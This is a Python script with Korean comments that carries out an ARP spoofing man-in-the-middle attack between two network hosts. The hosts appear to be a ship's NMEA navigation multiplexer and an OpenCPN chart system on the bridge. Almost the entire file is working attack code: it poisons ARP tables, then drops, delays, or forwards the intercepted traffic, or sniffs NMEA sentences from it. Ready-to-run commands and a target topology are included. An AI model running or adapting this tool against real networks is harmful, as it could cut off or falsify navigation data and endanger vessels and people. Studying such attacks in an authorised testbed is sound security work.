#!/usr/bin/env python3
"""
ARP MITM Attack - Network Layer Attack
Field <-> Bridge 간 통신 경로 탈취 공격

공격 시나리오 3: ARP Spoofing & Traffic Interception
- Layer 2 (Data Link) 공격
- Zone 간 통신 경로 자체를 공격
- 데이터 내용이 아닌 "패킷이 지나가는 길" 공격
"""

import argparse
import sys
import time
import socket
import threading
from scapy.all import ARP, Ether, send, sniff, sendp, IP, UDP
from scapy.layers.inet import TCP

class ARPMITMAttack:
    def __init__(self, target1_ip, target2_ip, interface='eth0', attack_mode='blackhole'):
        """
        ARP MITM 공격 초기화

        Args:
            target1_ip: 첫 번째 타겟 IP (예: Field NMEA Multiplexer)
            target2_ip: 두 번째 타겟 IP (예: Bridge OpenCPN)
            interface: 네트워크 인터페이스
            attack_mode: 공격 모드 (blackhole/delay/forward/sniff)
        """
        self.target1_ip = target1_ip
        self.target2_ip = target2_ip
        self.interface = interface
        self.attack_mode = attack_mode
        self.running = False

        # 지연 공격용 설정
        self.delay_seconds = 2.0  # 기본 2초 지연

        # 통계
        self.stats = {
            'arp_sent': 0,
            'packets_intercepted': 0,
            'packets_dropped': 0,
            'packets_forwarded': 0,
            'packets_delayed': 0
        }

        print(f"[*] ARP MITM Attack Initialized")
        print(f"    Target 1: {target1_ip}")
        print(f"    Target 2: {target2_ip}")
        print(f"    Interface: {interface}")
        print(f"    Attack Mode: {attack_mode.upper()}")

    def get_mac(self, ip):
        """IP 주소에 대한 MAC 주소 획득"""
        try:
            from scapy.all import getmacbyip
            mac = getmacbyip(ip)
            if mac:
                return mac
            # getmacbyip 실패 시 ARP 요청으로 직접 얻기
            ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=False)
            for _, rcv in ans:
                return rcv[Ether].src
        except Exception as e:
            print(f"[!] Error getting MAC for {ip}: {e}")
        return None

    def restore_network(self):
        """ARP 테이블 복구 (공격 종료 시)"""
        print("\n[*] Restoring network...")

        # 실제 MAC 주소 가져오기
        target1_mac = self.get_mac(self.target1_ip)
        target2_mac = self.get_mac(self.target2_ip)

        if target1_mac and target2_mac:
            # 정상 ARP 응답 전송 (복구)
            send(ARP(op=2, pdst=self.target1_ip, hwdst=target1_mac,
                    psrc=self.target2_ip, hwsrc=target2_mac), count=5, verbose=False)
            send(ARP(op=2, pdst=self.target2_ip, hwdst=target2_mac,
                    psrc=self.target1_ip, hwsrc=target1_mac), count=5, verbose=False)
            print("[+] Network restored")
        else:
            print("[!] Could not restore network (MAC not found)")

    def arp_spoof(self):
        """ARP Spoofing 지속 전송"""
        print("[*] Starting ARP spoofing...")

        # 공격자의 MAC 주소 (자동 탐지)
        try:
            import netifaces
            attacker_mac = netifaces.ifaddresses(self.interface)[netifaces.AF_LINK][0]['addr']
        except:
            # netifaces 없으면 scapy로 시도
            from scapy.all import get_if_hwaddr
            attacker_mac = get_if_hwaddr(self.interface)

        print(f"[+] Attacker MAC: {attacker_mac}")

        while self.running:
            try:
                # Target1에게: "Target2의 MAC은 나(공격자)야"
                arp1 = ARP(op=2, pdst=self.target1_ip, psrc=self.target2_ip, hwsrc=attacker_mac)

                # Target2에게: "Target1의 MAC은 나(공격자)야"
                arp2 = ARP(op=2, pdst=self.target2_ip, psrc=self.target1_ip, hwsrc=attacker_mac)

                send(arp1, verbose=False)
                send(arp2, verbose=False)

                self.stats['arp_sent'] += 2

                # 2초마다 ARP 갱신
                time.sleep(2)

            except KeyboardInterrupt:
                break
            except Exception as e:
                print(f"[!] ARP spoofing error: {e}")
                break

    def packet_callback(self, packet):
        """패킷 인터셉션 콜백"""
        # IP 패킷만 처리
        if not packet.haslayer(IP):
            return

        # Target1 <-> Target2 간 패킷만 필터링
        src_ip = packet[IP].src
        dst_ip = packet[IP].dst

        if not ((src_ip == self.target1_ip and dst_ip == self.target2_ip) or
                (src_ip == self.target2_ip and dst_ip == self.target1_ip)):
            return

        self.stats['packets_intercepted'] += 1

        # UDP 포트 확인 (NMEA는 10110)
        proto = "Unknown"
        port_info = ""
        if packet.haslayer(UDP):
            proto = "UDP"
            port_info = f":{packet[UDP].dport}"
        elif packet.haslayer(TCP):
            proto = "TCP"
            port_info = f":{packet[TCP].dport}"

        # 공격 모드별 처리
        if self.attack_mode == 'blackhole':
            # Black Hole: 패킷 완전 차단
            self.stats['packets_dropped'] += 1
            print(f"[DROP] {src_ip} → {dst_ip} ({proto}{port_info}) [BLOCKED]")
            # 패킷을 전달하지 않음 (return으로 종료)
            return

        elif self.attack_mode == 'delay':
            # Delay: 패킷 지연 후 전달
            self.stats['packets_delayed'] += 1
            print(f"[DELAY] {src_ip} → {dst_ip} ({proto}{port_info}) [+{self.delay_seconds}s]")

            # 지연 후 전달을 별도 스레드에서 처리
            def delayed_forward():
                time.sleep(self.delay_seconds)
                sendp(packet, iface=self.interface, verbose=False)
                self.stats['packets_forwarded'] += 1

            threading.Thread(target=delayed_forward, daemon=True).start()

        elif self.attack_mode == 'forward':
            # Forward: 정상 전달 (탐지 테스트용)
            self.stats['packets_forwarded'] += 1
            print(f"[FORWARD] {src_ip} → {dst_ip} ({proto}{port_info})")
            sendp(packet, iface=self.interface, verbose=False)

        elif self.attack_mode == 'sniff':
            # Sniff: 패킷 내용만 캡처하고 정상 전달
            print(f"[SNIFF] {src_ip} → {dst_ip} ({proto}{port_info})")

            # NMEA 데이터 추출 (UDP 10110)
            if packet.haslayer(UDP) and packet[UDP].dport == 10110:
                try:
                    payload = bytes(packet[UDP].payload).decode('utf-8', errors='ignore')
                    if payload.startswith('$') or payload.startswith('!'):
                        print(f"        NMEA: {payload.strip()}")
                except:
                    pass

            # 정상 전달
            sendp(packet, iface=self.interface, verbose=False)
            self.stats['packets_forwarded'] += 1

    def start_interception(self):
        """패킷 인터셉션 시작"""
        print(f"[*] Starting packet interception ({self.attack_mode} mode)...")

        # BPF 필터: Target1 <-> Target2 간 트래픽만
        bpf_filter = f"host {self.target1_ip} and host {self.target2_ip}"

        try:
            sniff(filter=bpf_filter, prn=self.packet_callback,
                  iface=self.interface, store=False)
        except Exception as e:
            print(f"[!] Interception error: {e}")

    def start(self):
        """공격 시작"""
        self.running = True

        # IP 포워딩 활성화 (Delay/Forward 모드에서 필요)
        if self.attack_mode in ['delay', 'forward', 'sniff']:
            try:
                import subprocess
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=1'],
                             capture_output=True, check=True)
                print("[+] IP forwarding enabled")
            except Exception as e:
                print(f"[!] Warning: Could not enable IP forwarding: {e}")

        # ARP Spoofing 스레드 시작
        arp_thread = threading.Thread(target=self.arp_spoof, daemon=True)
        arp_thread.start()

        print("[+] ARP spoofing started")
        print(f"[+] Attack mode: {self.attack_mode.upper()}")

        if self.attack_mode == 'blackhole':
            print("[!] WARNING: All packets will be DROPPED (Black Hole mode)")
        elif self.attack_mode == 'delay':
            print(f"[!] Packets will be delayed by {self.delay_seconds} seconds")

        print("\n[*] Press Ctrl+C to stop...\n")

        try:
            # 패킷 인터셉션 시작 (메인 스레드)
            self.start_interception()
        except KeyboardInterrupt:
            print("\n[*] Stopping attack...")
        finally:
            self.stop()

    def stop(self):
        """공격 종료"""
        self.running = False
        self.restore_network()

        # 통계 출력
        print("\n" + "="*50)
        print("Attack Statistics:")
        print(f"  ARP packets sent:      {self.stats['arp_sent']}")
        print(f"  Packets intercepted:   {self.stats['packets_intercepted']}")
        print(f"  Packets dropped:       {self.stats['packets_dropped']}")
        print(f"  Packets delayed:       {self.stats['packets_delayed']}")
        print(f"  Packets forwarded:     {self.stats['packets_forwarded']}")
        print("="*50)

        # IP 포워딩 비활성화
        if self.attack_mode in ['delay', 'forward', 'sniff']:
            try:
                import subprocess
                subprocess.run(['sysctl', '-w', 'net.ipv4.ip_forward=0'],
                             capture_output=True, check=True)
                print("[+] IP forwarding disabled")
            except:
                pass


def main():
    parser = argparse.ArgumentParser(
        description='ARP MITM Attack - Network Layer Attack (Layer 2)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Attack Modes:
  blackhole  - Drop all intercepted packets (완전 차단)
  delay      - Delay packets by N seconds (지연 공격)
  forward    - Forward packets normally (탐지 테스트)
  sniff      - Sniff and forward (패킷 캡처)

Examples:
  # Black Hole 공격 (Field -> Bridge 통신 완전 차단)
  sudo python3 arp_mitm_attack.py --target1 10.10.20.10 --target2 10.10.10.10 --mode blackhole

  # Delay 공격 (2초 지연)
  sudo python3 arp_mitm_attack.py --target1 10.10.20.10 --target2 10.10.10.10 --mode delay --delay 2

  # Sniff 모드 (NMEA 데이터 캡처)
  sudo python3 arp_mitm_attack.py --target1 10.10.20.10 --target2 10.10.10.10 --mode sniff

Network Topology:
  Field Zone (10.10.20.x)
    ├─ NMEA Multiplexer: 10.10.20.10
    └─ Sends to → 10.10.10.10:10110

  Bridge Zone (10.10.10.x)
    └─ OpenCPN: 10.10.10.10:10110

  Attacker: ARP spoofing both targets
        """)

    parser.add_argument('--target1', required=True,
                       help='First target IP (e.g., Field NMEA Multiplexer)')
    parser.add_argument('--target2', required=True,
                       help='Second target IP (e.g., Bridge OpenCPN)')
    parser.add_argument('--interface', default='eth0',
                       help='Network interface (default: eth0)')
    parser.add_argument('--mode', choices=['blackhole', 'delay', 'forward', 'sniff'],
                       default='blackhole',
                       help='Attack mode (default: blackhole)')
    parser.add_argument('--delay', type=float, default=2.0,
                       help='Delay in seconds for delay mode (default: 2.0)')

    args = parser.parse_args()

    # Root 권한 확인
    import os
    if os.geteuid() != 0:
        print("[!] Error: This script requires root privileges")
        print("    Run with: sudo python3 arp_mitm_attack.py ...")
        sys.exit(1)

    # Scapy 확인
    try:
        from scapy.all import ARP
    except ImportError:
        print("[!] Error: scapy not installed")
        print("    Install with: pip install scapy")
        sys.exit(1)

    print("="*60)
    print("ARP MITM Attack - Network Layer (L2) Attack")
    print("⚠️  WARNING: Educational purposes only!")
    print("="*60)

    # 공격 시작
    attacker = ARPMITMAttack(
        target1_ip=args.target1,
        target2_ip=args.target2,
        interface=args.interface,
        attack_mode=args.mode
    )

    # Delay 모드일 경우 지연 시간 설정
    if args.mode == 'delay':
        attacker.delay_seconds = args.delay

    try:
        attacker.start()
    except KeyboardInterrupt:
        print("\n[*] Attack interrupted by user")
    except Exception as e:
        print(f"\n[!] Error: {e}")
        import traceback
        traceback.print_exc()
    finally:
        print("\n[+] Attack stopped")


if __name__ == '__main__':
    main()
